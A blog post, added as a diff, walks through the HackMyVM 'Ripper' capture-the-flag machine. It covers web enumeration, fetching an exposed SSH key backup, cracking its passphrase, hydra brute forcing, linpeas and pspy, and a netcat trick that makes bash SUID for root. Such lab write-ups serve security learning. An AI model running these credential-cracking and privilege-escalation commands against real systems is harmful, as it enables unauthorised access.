@@ -1,0 +1,211 @@
+---
+title: "Ripper - HackMyVM"
+---
+
+nmap service scan:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/t800]
+└─$ nmap -p- -sV 192.168.56.254 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-06 14:12 EDT
+Nmap scan report for 192.168.56.254
+Host is up (0.00064s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+{% endhighlight %}
+
+running go buster to enumerate files and directories: 
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/ripper]
+└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -q -x php,txt,html,jpg,jpeg -u http://192.168.56.254/
+/index.html           (Status: 200) [Size: 57]
+/staff_statements.txt (Status: 200) [Size: 107]
+/server-status        (Status: 403) [Size: 279]
+{% endhighlight %}
+
+staff_statements.txt:
+{% highlight text %}
+The site is not yet repaired. Technicians are working on it by connecting with old ssh connection files.
+{% endhighlight %}
+
+"Old ssh connection files." what could that mean? It means they are potentially using
+.bak files, let's run another gobuster scan and specify bak in the extensions:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/ripper]
+└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -q -x txt,bak -u http://192.168.56.254/
+{% endhighlight %}
+
+while that's running let's try and wget an id_rsa.bak key from the webserver manually
+it actually worked:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/ripper]
+└─$ wget http://192.168.56.254/id_rsa.bak
+{% endhighlight %}
+
+We need to find the technicians username in order to login. I tried a few generic 
+ones with no luck so let's try to crack the ssh key using ssh2john.py:
+
+Generating the hash:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/ripper]
+└─$ ./ssh2john.py id_rsa.bak > id_rsa_hash
+{% endhighlight %}
+
+Using john to crack the hash: 
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/ripper]
+└─$ john -w=/usr/share/wordlists/rockyou.txt id_rsa_hash
+[SSH] cipher value of 6 is not supported!
+Using default input encoding: UTF-8
+No password hashes loaded (see FAQ)
+{% endhighlight %}
+
+Shit, there's no way of cracking it with john as the cypher isn't supported. Let's 
+try using RSAcrack.sh. Firstly we need to download it and install it in the usr/bin
+directory:
+{% highlight terminal %}
+root@kali:~# wget -q "https://raw.githubusercontent.com/d4t4s3c/RSAcrack/main/RSAcrack.sh" -O /usr/bin/RSAcrack
+root@kali:~# chmod +x /usr/bin/RSAcrack
+{% endhighlight %}
+
+Now as the kali user we can use the script:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/ripper]
+└─$ RSAcrack
+
+         ██████╗ ███████╗ █████╗
+         ██╔══██╗██╔════╝██╔══██╗
+         ██████╔╝███████╗███████║
+         ██╔══██╗╚════██║██╔══██║
+         ██║  ██║███████║██║  ██║
+         ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+  ██████╗██████╗  █████╗  ██████╗██╗  ██╗
+ ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
+ ██║     ██████╔╝███████║██║     █████╔╝ 
+ ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
+ ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
+  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
+
+[i] Example: RSAcrack <wordlist> <id_rsa>
+{% endhighlight %}
+
+This tool is a great addition. After a little while RSAcrack found the password:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/ripper]
+└─$ RSAcrack /usr/share/wordlists/rockyou.txt id_rsa.bak 
+
+         ██████╗ ███████╗ █████╗
+         ██╔══██╗██╔════╝██╔══██╗
+         ██████╔╝███████╗███████║
+         ██╔══██╗╚════██║██╔══██║
+         ██║  ██║███████║██║  ██║
+         ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+  ██████╗██████╗  █████╗  ██████╗██╗  ██╗
+ ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
+ ██║     ██████╔╝███████║██║     █████╔╝ 
+ ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
+ ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
+  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
+
+[-] Cracking: id_rsa.bak
+[-] Wordlist: /usr/share/wordlists/rockyou.txt
+[i] Status:
+    957/14344392 (0%) (bananas) )   
+[+] Password: bananas Line: 957
+{% endhighlight %}
+
+
+So we've got `bananas` as the key password, but now we need to find the user. 
+After not being able to enumerate anything on the web server I looked at a guide and
+the writer said that it's visible when the machine terminal is viewed rather than 
+being headless in VirtualBox. So we have our user jack. Let's use the key and 
+passphrase to login:
+
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/ripper]
+└─$ ssh -i id_rsa.bak jack@192.168.56.254
+Enter passphrase for key 'id_rsa.bak': 
+Linux ripper 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed May 26 15:28:56 2021 from 192.168.0.28
+jack@ripper:~$ 
+{% endhighlight %}
+
+Enumerating users on the system:
+{% highlight text %}
+root:x:0:0:root:/root:/bin/bash
+jack:x:1000:1000:,,,:/home/jack:/bin/bash
+helder:x:1001:1001:,,,:/home/helder:/bin/bash
+{% endhighlight %}
+
+Let's try to bruteforce the helder login with hydra:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/ripper]
+└─$ hydra -l helder -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.254 -vV
+{% endhighlight %}
+
+I let it run for 1000 attempts and quit the session. We'll need to do more more local
+enumeration. linpeas.sh to the rescue. 
+
+I transferred it over to the victim machine using a python http server and ran it. 
+
+Interesting info from linpeas.sh:
+`═╣ Can I read opasswd file? ............. jack:Il0V3lipt0n1c3t3a`
+
+So we have the credentials, let's try them for our other user on the system. 
+
+They worked for the helder user:
+{% highlight terminal %}
+helder@ripper:~$ls -asl
+total 32
+4 drwx------ 3 helder helder 4096 May 26 15:24 .
+4 drwxr-xr-x 4 root   root   4096 May 26 14:02 ..
+0 lrwxrwxrwx 1 root   root      9 May 26 14:03 .bash_history -> /dev/null
+4 -rw-r--r-- 1 helder helder  220 May 26 14:02 .bash_logout
+4 -rw-r--r-- 1 helder helder 3659 May 26 15:24 .bashrc
+4 drwxr-xr-x 3 helder helder 4096 May 26 15:08 .local
+4 -rw-r--r-- 1 helder helder  940 May 26 15:24 .profile
+4 -rwx------ 1 helder helder   33 May 26 15:10 user.txt
+4 -rw------- 1 helder helder   52 May 26 14:57 .Xauthority
+{% endhighlight %}
+
+User flag submitted.
+
+I consulted a guide once again to see the best course of action to take because I
+was lost. It suggested `pspy64` should be run to catch any processes we may have 
+missed. 
+
+Letting it run a while showed me the following:
+
+{% highlight text %}
+2021/11/06 21:16:01 CMD: UID=0    PID=24846  | /bin/sh -c nc -vv -q 1 localhost 10000 > /root/.local/out && if [ "$(cat /root/.local/helder.txt)" = "$(cat /home/helder/passwd.txt)" ] ; then chmod +s "/usr/bin/$(cat /root/.local/out)" ; fi
+{% endhighlight %}
+
+So this process runs netcat on local host on port 10000, it then compares helder.txt
+to a passwd.txt file in the helder directory. 
+
+Getting root:
+{% highlight terminal %}
+helder@ripper:~$echo "bash" > /tmp/root
+helder@ripper:~$nc -nlvp 10000 < /tmp/root 
+listening on [any] 10000 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 60522
+helder@ripper:~$nc -lnvp 10000 < /tmp/root 
+listening on [any] 10000 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 60524
+helder@ripper:~$ls -la /usr/bin/bash
+-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /usr/bin/bash
+helder@ripper:~$bash -p
+helder@ripper:~$whoami
+root
+{% endhighlight %}
+
+I submitted the flags and got the points. Hooray for points. 
